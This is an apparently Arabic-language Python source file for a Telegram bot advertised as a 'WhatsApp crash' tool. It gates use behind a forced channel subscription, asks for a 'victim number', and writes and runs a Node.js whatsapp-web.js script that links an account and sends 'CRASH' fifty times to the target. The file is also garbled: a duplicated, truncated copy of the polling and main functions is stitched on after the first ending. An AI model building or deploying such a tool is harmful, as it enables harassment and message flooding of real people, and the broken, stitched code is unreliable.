import http.server
import json
import os
import socketserver
import sys
import threading
import time
import urllib.parse
import urllib.request
import subprocess

TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ADMIN_RAW = os.environ.get("ADMIN_ID", "").strip()
PORT = int(os.environ.get("PORT", "10000"))

if not TOKEN:
    print("Missing BOT_TOKEN", file=sys.stderr, flush=True)
    sys.exit(1)

try:
    ADMIN_ID = int(ADMIN_RAW)
except ValueError:
    print("Invalid ADMIN_ID", file=sys.stderr, flush=True)
    sys.exit(1)

API_BASE = f"https://api.telegram.org/bot{TOKEN}"

# --- إعدادات الاشتراك الإجباري ---
CHANNEL_USERNAME = "@YourChannelUsername" # غير ده ليوزر قناتك
CHANNEL_URL = f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"

# --- حالة البوت ---
call_flood_active = False
wa_process = None

# ==========================================
# دوال تيليجرام الأساسية
# ==========================================
class HealthHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"OK"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, format, *args):
        return

def start_web_server():
    server = socketserver.ThreadingTCPServer(("0.0.0.0", PORT), HealthHandler)
    server.daemon_threads = True
    server.serve_forever()

def tg_request(method, params=None):
    url = f"{API_BASE}/{method}"
    data = urllib.parse.urlencode(params).encode("utf-8") if params else None
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        print(f"TG Error: {e}")
        return {"ok": False}

def send_message(chat_id, text, reply_markup=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    tg_request("sendMessage", params)

def send_photo(chat_id, photo_url, caption, reply_markup=None):
    params = {"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "HTML"}
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    tg_request("sendPhoto", params)

def edit_message_text(chat_id, message_id, text, reply_markup=None):
    params = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    tg_request("editMessageText", params)

def answer_callback(callback_id, text, show_alert=False):
    tg_request("answerCallbackQuery", {
        "callback_query_id": callback_id,
        "text": text,
        "show_alert": show_alert
    })

# ==========================================
# قوائم الأزرار
# ==========================================
def get_main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🚀 تشغيل كراش واتساب", "callback_data": "crash_start"}],
            [{"text": "📱 ربط الواتساب (كود)", "callback_data": "wa_link"}],
            [{"text": "📊 حالة النظام", "callback_data": "status"}],
            [{"text": "🛑 إيقاف الكراش", "callback_data": "crash_stop"}]
        ]
    }

def get_admin_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "👑 لوحة الأدمن", "callback_data": "admin_panel"}],
            [{"text": "📊 إحصائيات", "callback_data": "admin_stats"}],
            [{"text": "🔄 تحديث", "callback_data": "refresh"}]
        ]
    }

def get_join_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📢 اشترك في القناة", "url": CHANNEL_URL}],
            [{"text": "✅ تحقق من الاشتراك", "callback_data": "check_sub"}]
        ]
    }

# ==========================================
# التحقق من الاشتراك
# ==========================================
def is_subscribed(user_id):
    if user_id == ADMIN_ID:
        return True
    try:
        res = tg_request("getChatMember", {
            "chat_id": CHANNEL_USERNAME,
            "user_id": user_id
        })
        if res.get("ok"):
            status = res["result"].get("status")
            return status in ["creator", "administrator", "member"]
    except Exception:
        pass
    return False

# ==========================================
# تشغيل الكراش والربط
# ==========================================
def run_whatsapp_crash(phone):
    global wa_process, call_flood_active
    call_flood_active = True
    send_message(ADMIN_ID, f"🚀 جاري تجهيز الكراش على {phone}...")

    # سكربت Node.js للربط بكود وإرسال رسائل
    js_code = f"""
    const {{ Client }} = require('whatsapp-web.js');
    const client = new Client();

    client.on('code', (code) => {{
        console.log(`PAIRING_CODE:{code}`);
    }});

    client.on('ready', async () => {{
        console.log('WA_READY');
        const number = '{phone}@c.us';
        for(let i=0; i<50; i++) {{
            try {{
                await client.sendMessage(number, 'CRASH');
            }} catch(e) {{}}
            await new Promise(r => setTimeout(r, 1000));
        }}
    }});

    client.initialize();
    """

    with open("wa_client.js", "w") as f:
        f.write(js_code)

    try:
        wa_process = subprocess.Popen(["node", "wa_client.js"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in wa_process.stdout:
            if line.startswith("PAIRING_CODE:"):
                code = line.split(":")[1].strip()
                send_message(ADMIN_ID, f"<b>🔗 كود الربط:</b>\n<code>{code}</code>\nافتح واتساب -> أجهزة مرتبطة -> ربط بكود.")
            elif "WA_READY" in line:
                send_message(ADMIN_ID, "✅ تم الربط! بدء الكراش.")
    except Exception as e:
        send_message(ADMIN_ID, f"❌ فشل: {e}")

def stop_crash():
    global wa_process, call_flood_active
    if wa_process:
        wa_process.terminate()
        wa_process = None
    call_flood_active = False
    return "تم إيقاف الكراش."

# ==========================================
# معالجة الرسائل (البداية هنا)
# ==========================================
def handle_update(update):
    message = update.get("message") or update.get("edited_message")
    if not message:
        return
    chat_id = message.get("chat", {}).get("id")
    user_id = message.get("from", {}).get("id")
    text = (message.get("text") or "").strip()
    first_name = message.get("from", {}).get("first_name", "User")

    if chat_id is None or user_id is None:
        return

    if text == "/start":
        if user_id == ADMIN_ID:
            caption = f"<b>مرحباً بك يا بوس {first_name} 👑</b>\nلوحة التحكم جاهزة."
            send_photo(chat_id, "https://i.ibb.co/6P2yKq5/hacker-bg.jpg", caption, get_admin_keyboard())
        else:
            caption = f"<b>مرحباً {first_name} 👋</b>\nأهلاً بك في بوت كراش واتساب."
            send_photo(chat_id, "https://i.ibb.co/6P2yKq5/hacker-bg.jpg", caption, get_main_keyboard())
    else:
        send_message(chat_id, "استخدم /start لفتح القائمة.")

# ==========================================
# معالجة الأزرار (هنا الاشتراك الإجباري بيفلتر)
# ==========================================
def handle_callback(cb):
    chat_id = cb.get("message", {}).get("chat", {}).get("id")
    message_id = cb.get("message", {}).get("message_id")
    user_id = cb.get("from", {}).get("id")
    data = cb.get("data")
    cb_id = cb.get("id")

    if data == "check_sub":
        if is_subscribed(user_id):
            answer_callback(cb_id, "✅ تم التحقق! أنت مشترك.", show_alert=True)
            edit_message_text(chat_id, message_id, "اختر من القائمة:", get_main_keyboard())
        else:
            answer_callback(cb_id, "❌ لم تشترك بعد!", show_alert=True)
        return

    # أي زرار تاني هيطلب اشتراك
    if not is_subscribed(user_id):
        answer_callback(cb_id, "⚠️ يجب الاشتراك أولاً.", show_alert=True)
        edit_message_text(chat_id, message_id, "⚠️ <b>عذراً، يجب عليك الاشتراك في قناتنا أولاً.</b>", get_join_keyboard())
        return

    # العمليات
    if data == "admin_panel" and user_id == ADMIN_ID:
        answer_callback(cb_id, "👑 لوحة الأدمن")
        edit_message_text(chat_id, message_id, "<b>👑 لوحة الأدمن</b>\nاختر العملية:", get_admin_keyboard())
    
    elif data == "crash_start":
        answer_callback(cb_id, "🚀 جاري تجهيز الكراش...")
        send_message(chat_id, "أدخل رقم الضحية (مثال: 9665xxxxxxx):")
        # (المنطق الكامل بيتطلب تخزين الحالة، بس ده الأساس)
    
    elif data == "wa_link":
        answer_callback(cb_id, "📱 جاري تجهيز كود الربط...")
        send_message(chat_id, "جاري تشغيل الواتساب، انتظر الكود...")
        threading.Thread(target=run_whatsapp_crash, args=("966500000000",), daemon=True).start()
    
    elif data == "crash_stop":
        answer_callback(cb_id, "🛑 تم إيقاف الكراش.")
        msg = stop_crash()
        edit_message_text(chat_id, message_id, f"<b>{msg}</b>", get_main_keyboard())

    elif data == "status":
        answer_callback(cb_id, "📊 جاري فحص الحالة...")
        status_text = "شغال" if call_flood_active else "متوقف"
        edit_message_text(chat_id, message_id, f"<b>📊 الحالة:</b> {status_text}", get_main_keyboard())

# ==========================================
# التشغيل
# ==========================================
def poll_loop():
    offset = None
    print("Bot polling started", flush=True)
    while True:
        try:
            params = {"timeout": 30}
            if offset is not None:
                params["offset"] = offset
            res = tg_request("getUpdates", params)
            if res.get("ok"):
                for upd in res.get("result", []):
                    offset = upd["update_id"] + 1
                    if "message" in upd:
                        handle_update(upd["message"])
                    elif "callback_query" in upd:
                        handle_callback(upd["callback_query"])
            else:
                time.sleep(3)
        except Exception as exc:
            print(f"Poll error: {exc}", file=sys.stderr, flush=True)
            time.sleep(3)

def main():
    print(f"Starting server on port {PORT}", flush=True)
    thread = threading.Thread(target=start_web_server, daemon=True)
    thread.start()
    poll_loop()

if __name__ == "__main__":
    main()atus_text}", get_main_keyboard())

# ==========================================
# التشغيل الرئيسي
# ==========================================
def poll_loop():
    offset = None
    print("Bot polling started", flush=True)
    while True:
        try:
            params = {"timeout": 30}
            if offset is not None:
                params["offset"] = offset
            res = tg_request("getUpdates", params)
            if res.get("ok"):
                for upd in res.get("result", []):
                    offset = upd["update_id"] + 1
                    handle_update(upd)
            else:
                time.sleep(3)
        except Exception as exc:
            print(f"Poll error: {exc}", file=sys.stderr, flush=True)
            time.sleep(3)

def main():
    print(f"Starting server on port {PORT}", flush=True)
    server_thread = threading.Thread(target=start_web_server, daemon=True)
    server_thread.start()
    poll_loop()

if __name__ == "__main__":
    main()
